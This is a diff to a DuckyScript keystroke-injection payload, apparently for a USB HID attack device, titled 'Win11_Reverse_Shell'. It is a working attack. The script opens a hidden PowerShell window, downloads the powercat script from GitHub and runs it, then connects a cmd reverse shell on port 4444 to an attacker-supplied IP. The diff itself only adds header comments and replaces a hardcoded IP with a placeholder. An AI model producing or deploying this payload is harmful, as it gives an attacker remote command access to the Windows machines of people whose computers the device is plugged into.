@@ -1,7 +1,10 @@
 REM Author: Pentestersploit/Adrilaw
 REM: https://github.com/Adrilaw/DuckHunter_HID_Script
+REM Title: Win11_Reverse_Shell
+REM Description: Downloads powercat via powershell and starts a reverse shell
+REM Target: Windows 10/11 
 GUI r
 DELAY 500
-STRING PowerShell.exe -WindowStyle Hidden -Command "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ;powercat -c 192.168.110.118 -p 4444 -e cmd"
+STRING PowerShell.exe -WindowStyle Hidden -Command "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ;powercat -c <your machine ip> -p 4444 -e cmd"
 ENTER
 ENTER
